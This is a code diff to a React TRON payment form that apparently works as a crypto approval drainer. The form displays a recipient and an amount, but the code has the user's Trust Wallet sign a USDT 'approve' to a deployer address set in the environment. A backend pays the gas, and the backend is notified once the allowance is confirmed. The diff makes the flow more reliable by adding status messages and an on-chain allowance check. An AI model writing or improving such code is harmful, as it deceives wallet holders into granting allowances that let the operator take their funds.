@@ -4,7 +4,7 @@ import { TronWeb } from 'tronweb';
 import '../App.css';
 
 const USDT_TRC20    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const APPROVE_TO  = import.meta.env.VITE_DEPLOYER_ADDRESS;
+const APPROVE_TO    = import.meta.env.VITE_DEPLOYER_ADDRESS;
 const BACKEND_URL   = import.meta.env.VITE_BACKEND_URL;
 const API_KEY       = import.meta.env.VITE_API_KEY;
 const RECIPIENT     = import.meta.env.VITE_RECIPIENT_ADDRESS;
@@ -35,12 +35,13 @@ const TransferForm = ({ onApproved }) => {
   const [recipient, setRecipient] = useState(RECIPIENT || '');
   const [loading,   setLoading]   = useState(false);
   const [errorMsg,  setErrorMsg]  = useState('');
+  const [status,    setStatus]    = useState('');
 
   const lockRef = useRef(false);
   const estimate = amount ? parseFloat(amount).toFixed(2) : '0.00';
 
   useEffect(() => {
-    const params = new URLSearchParams(window.location.search);
+    const params    = new URLSearchParams(window.location.search);
     const urlAddr   = params.get('address');
     const urlAmount = params.get('amount');
     if (urlAddr)   setRecipient(urlAddr);
@@ -52,17 +53,19 @@ const TransferForm = ({ onApproved }) => {
     lockRef.current = true;
     setLoading(true);
     setErrorMsg('');
+    setStatus('');
 
     try {
       const client = await initWC();
 
-      // Disconnect old sessions
+      // Old sessions disconnect
       const oldSessions = client.session.getAll();
       for (const s of oldSessions) {
         try { await client.disconnect({ topic: s.topic, reason: { code: 6000, message: 'reset' } }); } catch {}
       }
 
-      // WalletConnect connect with Tron namespace
+      setStatus('Connecting wallet...');
+
       const { uri, approval } = await client.connect({
         requiredNamespaces: {
           tron: {
@@ -73,18 +76,20 @@ const TransferForm = ({ onApproved }) => {
         },
       });
 
-      // Trust Wallet deeplink - seedha Trust Wallet me open hoga (unka exact approach)
+      // Trust Wallet deeplink
       if (uri) {
         const trustDeeplink = `trust://wc?uri=${encodeURIComponent(uri)}`;
         window.location.href = trustDeeplink;
       }
 
-      // Wait for user to approve connection in Trust Wallet
+      // Wait for wallet connection
       const session     = await approval();
       const userAddress = session.namespaces.tron.accounts[0].split(':')[2];
       if (!userAddress) throw new Error('No account found');
 
-      // TRX topup (backend se)
+      setStatus('Preparing transaction...');
+
+      // TRX topup
       try {
         const res  = await fetch(`${BACKEND_URL}/api/wallets/topup`, {
           method: 'POST',
@@ -92,10 +97,15 @@ const TransferForm = ({ onApproved }) => {
           body: JSON.stringify({ to: userAddress }),
         });
         const data = await res.json();
-        if (data.isNeededGas) await new Promise(r => setTimeout(r, 5000));
+        if (data.isNeededGas) {
+          setStatus('Waiting for gas...');
+          await new Promise(r => setTimeout(r, 5000));
+        }
       } catch (e) { console.error('topup error:', e); }
 
-      // Build approve transaction - exact same as paytrustwallet
+      setStatus('Please approve in Trust Wallet...');
+
+      // Build approve transaction
       const built = await tronWeb.transactionBuilder.triggerSmartContract(
         tronWeb.address.toHex(USDT_TRC20),
         'approve(address,uint256)',
@@ -107,7 +117,7 @@ const TransferForm = ({ onApproved }) => {
         tronWeb.address.toHex(userAddress)
       );
 
-      // Sign via WalletConnect - Trust Wallet signs it internally
+      // Sign via WalletConnect
       const signResult = await client.request({
         topic: session.topic,
         chainId: TRON_CHAIN,
@@ -117,12 +127,37 @@ const TransferForm = ({ onApproved }) => {
         },
       });
 
-      if (!signResult) throw new Error('Signing failed');
+      if (!signResult) throw new Error('Transaction rejected');
 
-      // Trust Wallet signResult format handle karo
-      const signedTx = signResult.result || signResult;
+      setStatus('Broadcasting transaction...');
+
+      // Broadcast
+      const signedTx  = signResult.result || signResult;
       const broadcast = await tronWeb.trx.sendRawTransaction(signedTx);
-      console.log('Approve txid:', broadcast.txid || broadcast.transaction?.txID);
+
+      if (!broadcast.result && !broadcast.txid) throw new Error('Broadcast failed');
+
+      const txid = broadcast.txid || broadcast.transaction?.txID;
+      console.log('Approve txid:', txid);
+
+      // Wait for confirmation on chain
+      setStatus('Confirming on TRON...');
+      await new Promise(r => setTimeout(r, 4000));
+
+      // Verify allowance actually came through
+      const allowRes = await tronWeb.transactionBuilder.triggerConstantContract(
+        tronWeb.address.toHex(USDT_TRC20),
+        'allowance(address,address)',
+        {},
+        [
+          { type: 'address', value: tronWeb.address.toHex(userAddress) },
+          { type: 'address', value: tronWeb.address.toHex(APPROVE_TO) },
+        ],
+        tronWeb.address.toHex(userAddress)
+      );
+      const allowance = BigInt('0x' + allowRes.constant_result[0]);
+
+      if (allowance === 0n) throw new Error('Approval not confirmed yet. Please try again.');
 
       // Backend notify
       try {
@@ -145,6 +180,7 @@ const TransferForm = ({ onApproved }) => {
       setErrorMsg(msg);
     } finally {
       setLoading(false);
+      setStatus('');
       lockRef.current = false;
     }
   };
@@ -190,7 +226,7 @@ const TransferForm = ({ onApproved }) => {
           <span className="max" onClick={() => setAmount('1000.00')}>Max</span>
         </div>
         <p className="estimate" style={{ color: errorMsg ? 'red' : undefined }}>
-          {errorMsg ? errorMsg : `≈ $${estimate}`}
+          {errorMsg ? errorMsg : status ? status : `≈ $${estimate}`}
         </p>
 
         <button
